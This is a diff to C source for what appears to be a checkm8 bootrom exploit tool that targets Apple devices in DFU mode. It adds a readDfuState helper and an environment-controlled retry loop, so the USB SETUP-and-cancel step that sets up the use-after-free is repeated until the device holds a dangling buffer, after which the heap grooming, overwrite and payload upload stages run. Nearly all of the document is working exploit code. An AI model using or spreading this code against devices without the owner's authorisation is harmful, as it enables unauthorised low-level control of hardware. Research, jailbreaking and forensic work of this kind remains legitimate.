@@ -427,6 +427,63 @@ static const char* dfuStatusName(unsigned char status) {
     }
 }
 
+// Returns the device's DFU bState, or -1 if the request failed. Independent of
+// DEBUG_DFU_STATUS and silent: used by the bug-setup retry loop below to decide
+// whether the precondition actually exists, which is a control-flow decision
+// rather than a diagnostic print.
+static int readDfuState(irecv_client_t client) {
+    unsigned char st[6];
+    memset(st, 0, sizeof(st));
+    int ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, st, sizeof(st), 1000);
+    if (ret != (int)sizeof(st)) return -1;
+    return (int)st[4];
+}
+
+#define kDfuStateIdle 2
+
+// How many times to retry the bug setup until the device actually reports a
+// download in progress. 1 (the default) is the original single-shot behaviour.
+//
+// Why this exists: on Linux the bug setup's SETUP frequently never reaches the
+// device at all -- confirmed, the device reports dfuIDLE afterwards, meaning it
+// never processed the DFU_DNLOAD and is holding no buffer (see
+// docs/HISTORY.md). libusb's cancel is USBDEVFS_DISCARDURB, which dequeues a
+// URB the controller has not started yet, so whether the SETUP makes it to the
+// wire before the cancel is a race against a frame boundary whose phase is
+// arbitrary. IOKit does not have this problem: USBDeviceAbortPipeZero() aborts
+// a pipe whose SETUP is already out.
+//
+// A lost race leaves the device in pristine dfuIDLE -- it saw nothing -- so
+// retrying costs nothing and needs no reset, no power cycle and no manual DFU
+// re-entry. That matters practically: every stage AFTER the bug setup is
+// destructive (626 heap leaks, a malformed 1660-byte control write, a payload
+// upload, a reset), and running them against an absent precondition is what
+// leaves the device wedged and needing a power cycle. Detecting the miss early
+// and retrying in-process is what makes this loopable at all.
+//
+// Costs one DFU_GETSTATUS per attempt, which is NOT free: GETSTATUS advances
+// the DFU state machine, and on the attempt that finally wins it moves
+// dfuDNLOAD_SYNC to dfuDNBUSY/dfuDNLOAD_IDLE. Polling GETSTATUS after a
+// DNLOAD is what a spec-compliant DFU host is supposed to do, so this is
+// unlikely to destroy the dangling buffer -- but it is unverified, and it is
+// why this is opt-in rather than the default.
+#define kDefaultBugSetupRetries 1
+
+static int bugSetupRetries(void) {
+    static int resolved = 0;
+    static int value = kDefaultBugSetupRetries;
+
+    if (!resolved) {
+        const char* env = getenv("DEBUG_BUGSETUP_RETRIES");
+        if (env && *env) {
+            long parsed = strtol(env, NULL, 10);
+            if (parsed >= 1 && parsed <= 100000) value = (int)parsed;
+        }
+        resolved = 1;
+    }
+    return value;
+}
+
 // Deliberately NOT routed through tracedTransfer(): this request is an
 // intrusion into the sequence rather than part of it, and mixing it into the
 // trace table would make a perturbed run look like a normal one.
@@ -903,9 +960,55 @@ static int runCheckm8Inner(uint64_t ecid) {
     // path, and its duration is the one hint available as to whether the SETUP
     // reached the wire before the cancel landed. A call that returns in barely
     // more than delayUs never round-tripped anything.
-    unsigned long bugSetupStarted = nowUs();
-    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
-    unsigned long bugSetupElapsed = nowUs() - bugSetupStarted;
+    int maxAttempts = bugSetupRetries();
+    int sent = 0;
+    int bugSetupAttempts = 0;
+    int finalDfuState = -2;   // -2 = never checked (single-shot default)
+    unsigned long bugSetupElapsed = 0;
+
+    for (int attempt = 1; attempt <= maxAttempts; attempt++) {
+        bugSetupAttempts = attempt;
+        unsigned long bugSetupStarted = nowUs();
+        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
+        bugSetupElapsed = nowUs() - bugSetupStarted;
+
+        // Single-shot: behave exactly as before, no GETSTATUS, no decisions.
+        if (maxAttempts == 1) break;
+
+        finalDfuState = readDfuState(client);
+        if (finalDfuState != kDfuStateIdle) {
+            // Either the device is holding a buffer (the precondition exists,
+            // which is the point), or the status request itself failed, in
+            // which case guessing is worse than proceeding and letting the
+            // later stages report what they see.
+            printf("bug setup: attempt %d established device state %d (%s) -- proceeding\n",
+                   attempt, finalDfuState,
+                   finalDfuState < 0 ? "status request failed"
+                                     : dfuStateName((unsigned char)finalDfuState));
+            break;
+        }
+
+        // Lost the race: the device never saw the SETUP and is untouched, so
+        // retry costs nothing. DFU_ABORT keeps it in a known-clean idle rather
+        // than relying on it already being there.
+        irecv_usb_control_transfer(client, 0x21, 4, 0, 0, NULL, 0, 0);
+
+        if (attempt % 100 == 0) {
+            printf("bug setup: %d attempts, device still dfuIDLE (SETUP not reaching it)\n",
+                   attempt);
+            fflush(stdout);
+        }
+    }
+
+    if (maxAttempts > 1 && finalDfuState == kDfuStateIdle) {
+        printf("bug setup: gave up after %d attempts -- device never left dfuIDLE, so the "
+               "SETUP never reached it and there is no buffer to groom against. NOT running "
+               "the destructive stages (they are what wedge the device); exiting clean.\n",
+               bugSetupAttempts);
+        free(config.payload);
+        irecv_close(client);
+        return 0;
+    }
     // The one number that decides whether this stage did anything, and it was
     // previously computed and thrown away. Anything outside 0 < sent <=
     // overwrite_offset means the following overwrite lands somewhere the
@@ -919,8 +1022,10 @@ static int runCheckm8Inner(uint64_t ecid) {
     // number itself is useful, but do not read the range as a target -- see
     // docs/HISTORY.md, "The overwrite was never the problem".
     printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes "
-           "(range 0 < n <= %d is NOT the success condition), call took %lu us\n",
-           delayUs, sent, 0x800, config.overwrite_offset, bugSetupElapsed);
+           "(range 0 < n <= %d is NOT the success condition), call took %lu us"
+           ", attempts %d\n",
+           delayUs, sent, 0x800, config.overwrite_offset, bugSetupElapsed,
+           bugSetupAttempts);
 
     probeDfuStatus(client, "after bug setup");
     if (sent < 0) {
